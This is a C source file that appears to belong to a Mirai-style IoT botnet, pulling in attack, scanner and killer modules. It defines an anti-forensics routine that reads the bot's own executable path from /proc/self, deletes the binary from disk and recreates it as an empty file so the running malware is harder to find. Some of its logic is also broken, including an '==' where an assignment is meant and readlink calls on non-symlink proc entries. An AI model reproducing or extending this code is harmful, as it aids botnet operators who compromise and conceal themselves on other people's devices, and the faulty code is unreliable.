#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>

#include "includes.h"   
#include "table.h"
#include "rand.h"
#include "attack.h"
#include "resolv.h"
#include "killer.h"
#include "scanner.h"
#include "util.h"

/*
Clear Buffer Made by H4ReMiiXxYT
Selfrep#1337
*/

void ClearALLBuffer(void) {
#ifdef DEBUG
printf("[dbg / Clear Buffer]  Buffer Clearing Proccess Begging\n");
printf("[DEBUG] Clearing ALL\n");
table_unlock_val(CLEAR_EXEC_SUCCESS);
table_retrieve_val(CLEAR_EXEC_SUCCESS, NULL);
table_lock_val(CLEAR_EXEC_SUCCESS);
#endif
 char buf[600];
 char buf2[600];
 char buf3[600];
    int len = 0;
    int fd = -1;

    table_unlock_val(PROC_SELF_EXE);
    table_unlock_val(PROC_SELF_COMM);
    table_unlock_val(PROC_SELF_CMDLINE);

    if((len = readlink(table_retrieve_val(PROC_SELF_EXE, NULL), buf, sizeof(buf) - 1)) == -1)
    {
        return;
    }

    if((len = readlink(table_retrieve_val(PROC_SELF_COMM, NULL), buf2, sizeof(buf2) -1 )) == -1) {
    return; 
    }

    if((len = readlink(table_retrieve_val(PROC_SELF_CMDLINE, NULL), buf3, sizeof(buf3) -1)) == -1) {
        return;
    }
    

    remove(buf);
    remove(buf2);
    remove(buf3);
#ifdef DEBUG
    printf("[DEBUG] CLEARED BUFFER -> ALL\n");
#endif

    if((fd = open(buf, O_CREAT|O_WRONLY|O_TRUNC, 0777)) == -1)
    {
        return;
    }
    if((fd == open(buf2, O_CREAT|O_WRONLY|O_TRUNC, 0777)) == -1) 
    {
        return;
    }
    if((fd == open(buf3, O_CREAT|O_WRONLY|O_TRUNC, 0777)) == -1) 
    {
        return;
    }


    



#ifdef DEBUG 
    printf("[DEBUG] BUFFER REMADE -> ALL\n");
#endif
    close(fd); // close file descriptor
    table_lock_val(PROC_SELF_CMDLINE);
    table_lock_val(PROC_SELF_COMM);
    table_lock_val(PROC_SELF_EXE);
}




